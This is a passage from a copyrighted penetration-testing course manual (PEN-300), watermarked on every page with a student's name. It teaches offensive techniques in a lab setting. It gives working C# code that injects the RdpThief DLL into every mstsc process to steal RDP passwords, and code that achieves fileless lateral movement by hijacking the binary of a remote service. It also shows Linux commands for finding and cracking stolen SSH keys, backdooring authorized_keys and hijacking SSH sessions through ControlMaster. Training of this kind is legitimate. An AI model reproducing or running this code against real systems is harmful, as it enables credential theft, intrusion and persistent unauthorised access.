 S e r v e r :   d c 0 1 
 U s e r n a m e :   c o r p 1 \ a d m i n 
 P a s s w o r d :   l a b 
Listing 628 - Dumping credentials from mstsc.exe 
Note that the username in the output path is dynamically resolved and the numbered 
subdirectory at the end of the path is the session ID. 
While this technique presents us with the user’s username, domain, and password in clear text, 
we must know when an mstsc.exe process is started and launch our C# console application 
before the user enters the credentials. 
To improve on this, we can modify our injection code further to automatically detect when an 
instance of mstsc is started and then inject into it. 
We’ll implement this with an infinitely-running while loop. With each iteration of the loop, we’ll 
discover all instances of mstsc.exe and subsequently perform an injection into each of them. 
Finally, we’ll use the Thread.Sleep810 method to pause for one second between each iteration. To 
use this method, we must first import the System.Threading namespace with the using 
statement. 
using System.Threading; 
... 
static void Main(string[] args) 
{ 
  String dllName = "C:\\Tools\\RdpThief.dll"; 
  while(true) 
  { 
    Process[] mstscProc = Process.GetProcessesByName("mstsc"); 
 
810 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.threading.thread.sleep?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
522 
    if(mstscProc.Length > 0) 
    { 
      for(int i = 0; i < mstscProc.Length; i++) 
      { 
        int pid = mstscProc[i].Id; 
 
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid); 
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40); 
        IntPtr outSize; 
        Boolean res = WriteProcessMemory(hProcess, addr, 
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize); 
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), 
"LoadLibraryA"); 
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 
0, IntPtr.Zero); 
      } 
    } 
                    
    Thread.Sleep(1000); 
  } 
} 
Listing 629 - Injecting RdpThief into any spawned mstsc process 
Once we execute the updated C# console application, it will detect any running instances of 
mstsc and inject the RdpThief DLL into them before the user enters the credentials. 
In this section, we have leveraged research that allows us to capture the clear text passwords 
used on a compromised workstation when a Remote Desktop instance is started. 
13.1.5.1 Exercises 
1. 
Repeat the attack in this section and obtain clear text credentials. 
13.2 Fileless Lateral Movement 
As mentioned previously, there are only a small number of lateral movement techniques available 
on a Windows system that do not rely on vulnerabilities. Some, like PsExec and DCOM, require 
that services and files are written on the target system. Other techniques, such as PSRemoting, 
require ports to be open in the firewall that are not always permitted by default. 
In the following sections, we are going to discuss and implement a variant of PsExec that neither 
writes a file to disk nor creates an additional service to obtain code execution, both of which may 
aid in bypassing detection. 
13.2.1 
Authentication and Execution Theory 
Let’s take some time to discuss how PsExec, a part of the Sysinternals suite, works. At a high 
level, PsExec authenticates to SMB811 on the target host and accesses the DCE/RPC812 interface. 
PsExec will use this interface to access the service control manager, create a new service, and 
 
811 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Server_Message_Block 
812 (Wikipedia, 2019), https://en.wikipedia.org/wiki/DCE/RPC 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
523 
execute it. As part of the attack, the binary that is executed by the service is copied to the target 
host. 
In this section, we’ll leverage an attack813 that operates in a similar way. However, we will execute 
our code without registering a new service and we’ll use our previous tradecraft to do this without 
writing a file to disk. 
This technique involves two main tasks. First, our code must authenticate to the target host. 
Following that, it must execute the desired code. Authentication to the DCE/RPC interface and the 
service control manager is handled by the unmanaged OpenSCManagerW814 API. 
The function prototype of OpenSCManagerW is shown in Listing 630. 
SC_HANDLE OpenSCManagerW( 
  LPCWSTR lpMachineName, 
  LPCWSTR lpDatabaseName, 
  DWORD   dwDesiredAccess 
); 
Listing 630 - Function prototype for OpenSCManagerW 
To invoke OpenSCManagerW, we must supply the hostname of the target (lpMachineName) and 
the name of the database for the service control database (lpDatabaseName). Supplying a null 
value will use the default database. Finally, we must pass the desired access (dwDesiredAccess) 
to the service control manager. 
The API is executed in the context of the access token of the executing thread, which means no 
password is required. 
If authentication is successful, a handle is returned that is used to interact with the service control 
manager. PsExec performs the same actions when invoked, but then it calls CreateServiceA815 to 
set up a new service. 
Our approach will be more subversive. We will instead use the OpenService816 API to open an 
existing service and invoke ChangeServiceConfigA817 to change the binary that the service 
executes. 
This will not leave any service creation notifications and may evade detection. Once the service 
binary has been updated, we will issue a call to StartServiceA,818 which will execute the service 
binary and give us code execution on the remote machine. 
Since we control the service binary, we can use a PowerShell download cradle to avoid saving a 
file to disk. If endpoint protections such as application whitelisting are in place, this approach may 
not be as straightforward and may require a bypass (such as the use of InstallUtil or an XSL 
transform). 
 
813 (MrUn1k0d3r, 2019), https://github.com/Mr-Un1k0d3r/SCShell 
814 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw 
815 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea 
816 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicea 
817 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-changeserviceconfiga 
818 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicea 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
524 
 
It is worth noting that since the OpenSCManagerW authentication API executes 
in the context of the access token of the thread, it is very easy to pass the hash 
with this technique as well. We could simply use Mimikatz to launch the 
application with the sekurlsa::pth command. 
Now that we understand the various techniques required, let’s implement this in code. 
13.2.2 
Implementing Fileless Lateral Movement in C 
To implement this, we’ll begin by creating a new C# console application project. The first API we 
must call is OpenSCManagerW. The P/invoke implementation819 is shown in Listing 631. 
[DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
CharSet=CharSet.Unicode, SetLastError=true)] 
    public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
uint dwAccess); 
Listing 631 - P/invoke for OpenSCManagerW 
From our discussion of the function prototype of OpenSCManagerW, we know that the first 
argument is the hostname of the target machine, or appsrv01 in our case. We’ll set the second 
argument (the database name) to null and the third argument to the desired access right to the 
service control manager. We’ll request SC_MANAGER_ALL_ACCESS (full access), which has a 
numerical value of 0xF003F.820 
We can now create a proof of concept that will invoke the API and perform the authentication: 
using System; 
using System.Runtime.InteropServices; 
 
namespace lat 
{ 
    class Program 
    { 
        [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, 
CharSet=CharSet.Unicode, SetLastError=true)] 
    public static extern IntPtr OpenSCManager(string machineName, string databaseName, 
uint dwAccess); 
 
        static void Main(string[] args) 
        { 
            String target = "appsrv01"; 
             
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F); 
        }        
    } 
} 
 
819 (pinvoke.net, 2020), http://pinvoke.net/default.aspx/advapi32/OpenSCManager.html 
820 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/services/service-security-and-access-rights 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
525 
Listing 632 - Initial proof of concept to authenticate 
Once the authentication is complete, we must open an existing service. To avoid any issues, we 
must select a service that is not vital to the function of the operating system and is not in use by 
default. 
One candidate is SensorService,821 which manages various sensors. This service is present on 
both Windows 10 and Windows 2016/2019 by default but is not run automatically at boot. 
The API we need to use is OpenService, which has the following function prototype: 
SC_HANDLE OpenServiceW( 
  SC_HANDLE hSCManager, 
  LPCWSTR   lpServiceName, 
  DWORD     dwDesiredAccess 
); 
Listing 633 - Function prototype for OpenServiceW 
As the first argument (hSCManager), we must supply the handle to the service control manager 
we received from OpenSCManager. The second parameter (lpServiceName) is the name of the 
service (“SensorService”) and the last argument (dwDesiredAccess) is the desired access to the 
service. 
We can request full access (SERVICE_ALL_ACCESS), which has a numerical value of 0xF01FF. To 
continue, we’ll locate the P/invoke import for OpenService822 as shown in Listing 634. 
[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)] 
static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint 
dwDesiredAccess); 
Listing 634 - P/invoke for OpenSCManagerW 
Now that the import is complete and we understand the arguments we need to pass, we can 
update the code to call OpenService: 
string ServiceName = "SensorService"; 
IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF); 
Listing 635 - Code to call OpenService 
After the SensorService service has been opened, we must change the service binary with the 
ChangeServiceConfigA API. The function prototype for this API is shown in Listing 636. 
BOOL ChangeServiceConfigA( 
  SC_HANDLE hService, 
  DWORD     dwServiceType, 
  DWORD     dwStartType, 
  DWORD     dwErrorControl, 
  LPCSTR    lpBinaryPathName, 
  LPCSTR    lpLoadOrderGroup, 
  LPDWORD   lpdwTagId, 
  LPCSTR    lpDependencies, 
  LPCSTR    lpServiceStartName, 
 
821 (batcmd.com, 2020), http://batcmd.com/windows/10/services/sensorservice/ 
822 (pinvoke.net, 2020), https://www.pinvoke.net/default.aspx/advapi32.openservice 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
526 
  LPCSTR    lpPassword, 
  LPCSTR    lpDisplayName 
); 
Listing 636 - Function prototype for ChangeServiceConfigA 
While the API accepts many arguments, we only need to specify some of them. The first 
(hService) is the handle to the service we obtained from calling OpenService. Next, dwServiceType 
allows us to specify the type of the service. 
We only want to modify the service binary so we’ll specify SERVICE_NO_CHANGE by its numerical 
value, 0xffffffff. 
We can modify the service start options through the third argument (dwStartType). Since we want 
to have the service start once we have modified the service binary, we’ll set it to 
SERVICE_DEMAND_START (0x3). As the fourth argument, dwErrorControl will set the error action 
and we’ll specify SERVICE_NO_CHANGE (0) to avoid modifying it. 
The fifth argument (lpBinaryPathName) contains the path of the binary that the service will 
execute when started. This is what we want to update and as an initial proof of concept, we’ll set 
this to “notepad.exe”. 
The final six arguments are not relevant to us and we can set them to null. The final piece we 
need is the P/invoke import of ChangeServiceConfig:823 
[DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")] 
[return: MarshalAs(UnmanagedType.Bool)] 
public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, 
int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, 
string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, 
string lpDisplayName); 
Listing 637 - P/invoke for ChangeServiceConfig 
At this point, we can update our code to invoke the call with the discussed arguments: 
string payload = "notepad.exe"; 
bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, 
null, null, null, null); 
Listing 638 - Code to call ChangeServiceConfig 
Once the proof of concept is compiled, we can execute it on the Windows 10 client in the context 
of the dave user. This will change the service binary of SensorService to notepad.exe. We can log 
in to appsrv01 and verify this as shown in Figure 236 from the services manager. 
 
823 (pinvoke.net, 2020), https://www.pinvoke.net/default.aspx/advapi32/changeserviceconfig.html 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
527 
 
Figure 236: SensorService service binary is changed to notepad 
The final step is to start the service, which we can do through the StartService API. The function 
prototype for this API is relatively simple as shown in Listing 639. 
BOOL StartServiceA( 
  SC_HANDLE hService, 
  DWORD     dwNumServiceArgs, 
  LPCSTR    *lpServiceArgVectors 
); 
Listing 639 - Function prototype for StartService 
The first argument (hService) is the service handle created by OpenService. The third argument 
(*lpServiceArgVectors) is an array of strings that are passed as arguments to the service. We do 
not require any so we can set it to null and then set dwNumServiceArgs, which is the number of 
arguments, to 0 as well. 
The P/invoke import for StartService824 is shown in Listing 640. 
[DllImport("advapi32", SetLastError=true)] 
[return: MarshalAs(UnmanagedType.Bool)] 
public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] 
lpServiceArgVectors); 
Listing 640 - P/invoke for StartService 
Finally, we’ll add the code to invoke the API: 
bResult = StartService(schService, 0, null); 
Listing 641 - Code to call StartService 
Once this code has been added to the project, we can compile and execute it in the context of the 
dave user. On appsrv01, we find the Notepad process running as SYSTEM: 
 
824 (pinvoke.net, 2020), https://www.pinvoke.net/default.aspx/advapi32.startservice 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
528 
 
Figure 237: Notepad started from SensorService service 
Since Notepad is not a service executable, the service control manager will terminate the process 
after a short period of time, but we have obtained the code execution we desire. 
SCShell,825 which has been implemented in C#, C, and Python, takes this a bit 
farther and weaponizes this technique. It also uses the QueryServiceConfig826 
API to detect the original service binary. After we have obtained code execution, 
SCShell will restore the service binary back to its original state to further aid 
evasion. 
In this section, we have discussed and implemented a technique that expands on PsExec to 
provide lateral movement without creating a new service. 
13.2.2.1 Exercises 
1. 
Repeat the steps in this section to implement the proof of concept that executes Notepad on 
appsrv01. 
2. 
Use the Python implementation of SCShell (scshell.py) to get code execution on appsrv01 
directly from Kali using only the NTLM hash of the dave user. 
13.3 Wrapping Up 
In this module, we discussed many topics related to lateral movement in Windows. 
We covered various techniques for abusing RDP in lateral movement both for GUI and console 
access and even over reverse proxies. We also discussed credential theft. Finally, we wrapped up 
with an in-depth discussion of PsExec and implemented a more stealthy version. 
 
825 (MrUn1k0d3r, 2019), https://github.com/Mr-Un1k0d3r/SCShell 
826 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-queryserviceconfiga 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
529 
 
14 Linux Lateral Movement 
While organizations commonly use Windows for workstations and Active Directory services, the 
Linux operating system is often used for web and database servers, infrastructure support, and 
more. As penetration testers, it’s important to understand how to compromise Linux targets and 
then pivot through them. 
In this module, we’ll demonstrate a variety of Linux-based lateral movement techniques. First, 
we’ll leverage SSH and demonstrate how to steal keys and hijack open sessions. We will then 
explore large-scale DevOps827 technologies and leverage both Ansible and Artifactory. Finally, we’ll 
demonstrate how Kerberos-enabled Linux systems can create a bridge into Windows domains 
and leverage this for lateral movement. 
In this module, we have configured the /etc/hosts file on our Kali machine to resolve the following 
hostnames with their corresponding IP addresses: 
• 
controller: 192.168.120.40 
• 
linuxvictim: 192.168.120.45 
• 
dc01.corp1.com: 192.168.120.5 
Not every approach discussed in this module requires root access, but, as is the case with most 
Windows-based techniques, many lateral movements require elevated privileges. 
14.1 Lateral Movement with SSH 
SSH828 is a network protocol and suite of tools used to communicate between networked 
systems. It is one of the most commonly-used methods for communicating between Linux 
machines. 
Although some systems still permit password authentication to connect to a Linux machine via 
SSH, many require public key authentication829 instead. This method requires a user-generated 
public and private key pair. The public key is stored in the ~/.ssh/authorized_keys file of the server 
the user is connecting to. The private key is typically stored in the ~/.ssh/ directory on the system 
the user is connecting from. 
When a user connects to a target server, the SSH client will use the user’s private key (if present) 
to authenticate with the target system. If the private key has been protected with a passphrase, 
the user must also provide that during the authentication process. Additionally, the key must be 
accepted on the target system for the authentication to succeed. 
Private SSH keys are a prime target for an attacker, since they can provide access to any remote 
machine that accepts the key. As such, they are an excellent opportunity for lateral movement. 
 
827 (Wikipedia, 2020), https://en.wikipedia.org/wiki/DevOps 
828 (SSH Communications Security, Inc., 2020), https://www.ssh.com/ssh/ 
829 (SSH Communications Security, Inc., 2020), https://www.ssh.com/ssh/public-key-authentication 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
530 
Let’s discuss some basic techniques that can be used to gain access to a user’s private key and 
demonstrate how these keys can be leveraged. 
14.1.1 
SSH Keys 
Because private keys are obvious targets, there are often additional protections in place. Typically, 
a user’s SSH key will have permissions set to 600.830 
It’s possible that during a penetration test, we could find a private key with weak permissions. 
Even if we do not have root access to the machine, it’s worth checking the target system in the 
unlikely event that a key has been left unprotected. 
Let’s look for potentially unprotected keys with a simple find command on our linuxvictim VM. 
In Linux, private keys are named id_rsa by default. The following command won’t find files that are 
named differently, but it’s a good starting point. If we don’t have permission to view the file, we’ll 
receive a “Permission denied” error message. 
offsec@linuxvictim:~$ find /home/ -name "id_rsa" 
/home/offsec/.ssh/id_rsa 
find: ‘/home/linuxvictim/.ssh’: Permission denied 
... 
find: ‘/home/ansibleadm/.gnupg’: Permission denied 
find: ‘/home/ansibleadm/.local/share’: Permission denied 
Listing 642 - Finding private keys on the system 
There are no keys with insecure permissions on this system, which should not come as a 
surprise. 
In the next step, since we are discussing lateral movement, we will assume that we have gained 
root access to the machine and will operate with those privileges. 
It’s not uncommon for users to copy their keys to a different location than the default 
/home/username/.ssh/ folder or to have copies of keys with different names. Because of this, 
we’ll inspect the /home directory once again and browse other user’s files with our elevated 
privileges. 
If we examine the /home/linuxvictim directory, we note that a private key with an unconventional 
name, svuser.key, is stored there. 
root@linuxvictim:/home/linuxvictim# ls -al 
total 28 
drwxr-xr-x 2 linuxvictim linuxvictim 4096 May 28 14:27 . 
drwxr-xr-x 8 root        root        4096 May 28 14:23 .. 
-rw------- 1 linuxvictim linuxvictim  270 May 28 14:31 .bash_history 
-rw-r--r-- 1 linuxvictim linuxvictim  220 May 28 14:22 .bash_logout 
-rw-r--r-- 1 linuxvictim linuxvictim 3771 May 28 14:22 .bashrc 
-rw-r--r-- 1 linuxvictim linuxvictim  807 May 28 14:22 .profile 
drwx------ 2 linuxvictim linuxvictim 4096 May 28 14:34 .ssh 
-rw-------  1 linuxvictim linuxvictim 1766 May 28 14:26 svuser.key 
Listing 643 - Found a private key 
 
830 (Ubuntu, 2015), https://help.ubuntu.com/community/SSH/OpenSSH/Keys 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
531 
Once we have located a private key, we will need to analyze it. As we mentioned before, an SSH 
key can be protected with a passphrase. 
When generating an SSH key in the terminal in most Linux/Unix systems, the 
program asks the user to choose a passphrase to keep unauthorized users from 
using the key. The user often chooses to bypass this step with the Return key, 
inadvertently exposing the key to unauthorized use. 
There are a few ways to find out if our key is protected with a passphrase. We could just try and 
use the key with an SSH client and find out if we get a passphrase prompt, but this could trigger a 
log or an alert. 
A safer and more discreet alternative is to simply view the file itself. We’ll do that now. 
root@linuxvictim:/home/linuxvictim# cat svuser.key  
-----BEGIN RSA PRIVATE KEY----- 
Proc-Type: 4,ENCRYPTED 
DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380 
... 
Listing 644 - First few lines of an passphrase-encrypted SSH key 
In this case, the file contains “Proc-Type” and “DEK-Info” headers. In this case, the “Proc-Type” 
header states that the key is encrypted. The “DEK-Info” header states that the encryption type is 
“AES-128-CBC”. This tells us that the key is protected with a passphrase. 
Even though we have the key, it’s not immediately obvious where to use it. Inspecting the 
/etc/passwd file, we observe that there is no svuser account, so it’s not likely that the key is for 
this machine. 
One approach is to read the user’s ~/.ssh/known_hosts file to find machines that have been 
connected to recently. It’s possible we can connect to one of these other machines using the 
svuser key. 
root@linuxvictim:/home/linuxvictim/.ssh# cat known_hosts  
|1|mi1rxMgRi2EjLJrnho0dY+rPbRw=|br04hDom/EK01Um6NvJIe7e688I= ecdsa-sha2-nistp256 
AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDY+XpA06WG/ohtJ0cqRa6YSKD03CSYIod
9zmauN89SBAPD9hMG0E6BN8MN7mXrXvHMRihk578XX5ToaWszhLZI= 
Listing 645 - Known hosts entries are hashed 
Unfortunately, in our case, the system has the HashKnownHosts setting enabled in 
/etc/ssh/ssh_config, so entries in the known_hosts file are hashed. Reading the file does not give 
us any useful information. 
Another easy option is checking the user’s ~/.bash_history file. The .bash_history file shows the 
terminal commands that the user has typed in over time. 
root@linuxvictim:/home/linuxvictim# tail .bash_history  
exit 
ssh -i ./svuser.key svuser@controller 
cd /home/linuxvictim 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
532 
ls 
ls -al 
cd .ssh 
ls -al 
cat known_hosts  
clear 
exit 
Listing 646 - Checking the bash history file 
In this case, we find that they connected to the controller server using the svuser account and the 
key we found. 
We’ll use the host command to determine the IP address of the controller machine. 
root@linuxvictim:/home/linuxvictim# host controller 
controller has address 192.168.120.40 
Listing 647 - Determining the controller’s IP address 
The fact that the key has a passphrase is an obstacle for us, as it makes it more difficult to steal 
and use the key. However, in this case, the passphrase check is done on the client side. This 
means we can try and crack the passphrase offline. 
To do this, we first copy the key file over to our Kali VM. 
We have a few options to crack the passphrase. We could use Hashcat,831 which can use the GPU 
to speed up processing, but in this case, we’ll use John the Ripper (JTR). 
To use JTR, we need to convert our stolen passphrase-encrypted private key to a format that the 
tool will recognize. To do that we can use the SSH2John utility that comes with JTR. In Kali, 
SSH2John is located at /usr/share/john/ssh2john.py. 
To convert the key file, we provide the key file name as an argument and redirect the output to a 
new file. 
kali@kali:~$ python /usr/share/john/ssh2john.py svuser.key > svuser.hash 
Listing 648 - Converting our SSH key to a JTR-compatible format 
Now that our key is ready, we need to decide on a good wordlist. There are many approaches to 
choosing appropriate wordlists, but for sake of simplicity, we’ll start with the commonly-used 
rockyou.txt wordlist, which can be found in Kali in the /usr/share/wordlists/ directory. 
We can now run JTR on the file with the --wordlist option to crack the passphrase. 
kali@kali:~$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash 
Using default input encoding: UTF-8 
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) 
... 
Listing 649 - Cracking the passphrase 
After a bit of time, JTR reports that it successfully discovered the passphrase, which is 
“spongebob”. 
 
831 (hashcat), https://hashcat.net/hashcat/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
533 
... 
Press 'q' or Ctrl-C to abort, almost any other key for status 
spongebob        (svuser.key) 
Listing 650 - Discovering the passphrase 
SSH clients typically require private keys to have permissions of 600 before being 
used to connect to a remote server. 
Now that we know the passphrase, let’s attempt to connect to the controller VM from the SSH 
session we have on the linuxvictim server. This will help avoid setting off any alerts, which we 
might encounter if connecting directly from our Kali VM. After specifying the svuser.key file as our 
private key, we can enter “spongebob” when prompted for our passphrase. 
linuxvictim@linuxvictim:~$ ssh -i ./svuser.key svuser@controller 
Enter passphrase for key './svuser.key':  
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64) 
... 
Last login: Fri May 15 10:57:13 2020 from 192.168.119.120 
svuser@controller:~$ 
Listing 651 - Connected successfully using our stolen key 
This time, we are successfully connected to the target. 
14.1.2 
SSH Persistence 
Aside from stealing a user’s private keys to facilitate access to other systems, another useful 
tactic is to insert our public key into a user’s ~/.ssh/authorized_keys file. The authorized_keys file 
is a list of all of the public keys permitted to access the user’s account on the current machine. 
Adding our public key to a user’s authorized_keys file will allow us to access the machine again via 
SSH later on. 
Normally, we might copy public keys from a remote system with ssh-copy-id,832 which requires 
authentication. However, if we have write access, we could simply append a new line to 
authorized_keys. Note that most Linux systems require 644 permissions on authorized_keys, 
which means we that only the file owner and root can write to the file. 
Let’s take a look at the linuxvictim machine in the lab. If we’ve gained access as the linuxvictim 
user or root, we can add an SSH public key to linuxvictim’s authorized_keys file to maintain 
access. To do that, we’ll first need to create an SSH keypair on our Kali VM. 
We can set up an SSH keypair on our Kali VM with ssh-keygen. 
kali@kali:~# ssh-keygen 
Generating public/private rsa key pair. 
Enter file in which to save the key (/home/kali/.ssh/id_rsa):  
Enter passphrase (empty for no passphrase):  
Enter same passphrase again:  
 
832 (die.net), https://linux.die.net/man/1/ssh-copy-id 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
534 
Your identification has been saved in /home/kali/.ssh/id_rsa. 
Your public key has been saved in /home/kali/.ssh/id_rsa.pub. 
The key fingerprint is: 
SHA256:VTLfYd2shCqYOTkpZqeHRrqxnKjyVViNgbmVMpKyEug root@kali 
The key's randomart image is: 
+---[RSA 2048]----+ 
|.  . o..  o ..oo.| 
|+ o = o+   =.o..+| 
|.+ . =o*. ...... | 
|oE  *oX ...   .  | 
|.  =.=.oS.       | 
|  o +..          | 
| o *..           | 
|o =.             | 
|+..              | 
+----[SHA256]-----+ 
Listing 652 - Generating an SSH keypair 
If we accept the default values for the file path, it will create a pair of files in our ~/.ssh/ directory. 
We will get id_rsa for the private key and id_rsa.pub for the public key. We can then cat the 
contents of id_rsa.pub and copy it to the clipboard. 
On the linuxvictim machine, we can insert the public key into the linuxvictim user’s 
authorized_keys file with the following command. 
linuxvictim@linuxvictim:~$ echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= 
kali@kali" >> /home/linuxvictim/.ssh/authorized_keys 
Listing 653 - Inserting the public key 
We can then ssh from our Kali VM using our private key to the linuxvictim machine and log in as 
the linuxvictim user without a password. If we don’t specify an SSH private key to use, the SSH 
client will use the one in ~/.ssh/id_rsa. 
kali@kali:~$ ssh linuxvictim@linuxvictim 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64) 
... 
linuxvictim@linuxvictim:~$  
Listing 654 - SSHing to linuxvictim using our inserted key 
Backdooring authorized_keys files, stealing unprotected SSH keys, and brute forcing SSH 
passphrases are all useful tactics to use in a penetration test. In the next section, we’ll discuss 
some more advanced ways to abuse SSH. 
14.1.2.1 Exercises 
1. 
Generate a private keypair with a passphrase on your Kali VM. Try to crack the passphrase 
using JTR. 
2. 
Generate a private keypair on your Kali VM and insert your public key in the linuxvictim user’s 
authorized_keys file on the linuxvictim host and then SSH to it. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
535 
14.1.3 
SSH Hijacking with ControlMaster 
In this section we’ll discuss the SSH hijacking833 attack, which is especially effective for lateral 
movement. This approach is similar to taking over an existing RDP session on Windows. 
The term SSH hijacking refers to the use of an existing SSH connection to gain access to another 
machine. Two of the most common methods of SSH hijacking use the ControlMaster834 feature 
or the ssh-agent.835 
ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network 
connection. This functionality can be enabled for a given user by editing their local SSH 
configuration file (~/.ssh/config). 
This file can be created or modified by users with elevated privileges or write access to the user’s 
home folder. By doing so, a malicious actor can create an attack vector when there wasn’t one 
originally, by enabling ControlMaster functionality for an unwitting user. 
Let’s examine this scenario in detail. We’ll begin by logging in as the offsec user to the controller 
VM, simulating an attacker gaining shell access to that account. Next, we’ll create a 
ControlMaster configuration for the offsec user. We’ll then simulate a legitimate user logged in as 
offsec on the same machine connecting into a downstream server and hijack that connection. 
We’ll start by logging in to our Linux controller machine as the offsec user, and create the 
~/.ssh/config file, with the following content: 
Host * 
        ControlPath ~/.ssh/controlmaster/%r@%h:%p 
        ControlMaster auto 
        ControlPersist 10m 
Listing 655 - ControlMaster config entry for SSH 
Let’s examine this file in more detail. 
Although it is possible to configure ControlPath settings for a specific host, the above 
configuration entry’s first line specifies that the configuration is being set for all hosts (*). 
The ControlPath entry in our example specifies that the ControlMaster socket file should be 
placed in ~/.ssh/controlmaster/ with the name <remoteusername@<targethost>:<port>. This 
assumes that the specified controlmaster folder actually exists. 
The ControlMaster line identifies that any new connections will attempt to use existing 
ControlMaster sockets when possible. When those are unavailable, it will start a new connection. 
ControlPersist can either be set to “yes” or to a specified time. If it is set to “yes”, the socket stays 
open indefinitely. Alternatively, it will accept new connections for a specified amount of time after 
the last connection has terminated. In the above configuration, the socket will remain open for 10 
minutes after the last connection and then it will close. 
 
833 (The MITRE Corporation, 2020), https://attack.mitre.org/techniques/T1184/ 
834 (OpenBSD, 2020), http://man.openbsd.org/ssh_config.5#ControlMaster 
835 (SSH Communications Security, Inc., 2020), https://www.ssh.com/ssh/agent 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
536 
 
These ControlMaster settings can also be placed in /etc/ssh/ssh_config to 
configure ControlMaster at a system-wide level. 
The number of available concurrent connections for SSH using this method defaults to 10 as set 
in the MaxSessions836 variable in /etc/ssh/ssh_config,837 but may vary on different systems 
depending on how they are configured. 
Before moving forward, we’ll set the correct permission on the configuration file. 
offsec@controller:~$ chmod 644 ~/.ssh/config 
Listing 656 - Setting the ControlMaster config file permissions 
Once we’ve done that, we will create the required ~/.ssh/controlmaster/ directory. 
offsec@controller:~$ mkdir ~/.ssh/controlmaster 
Listing 657 - Creating the controlmaster socket directory 
Next, to simulate our victim connecting to a downstream server, we’ll SSH to the controller VM as 
the legitimate offsec user. We’ll then SSH from the controller VM to the linuxvictim VM in the 
same session. 
Note that we need to provide a password for this last connection. The offsec 
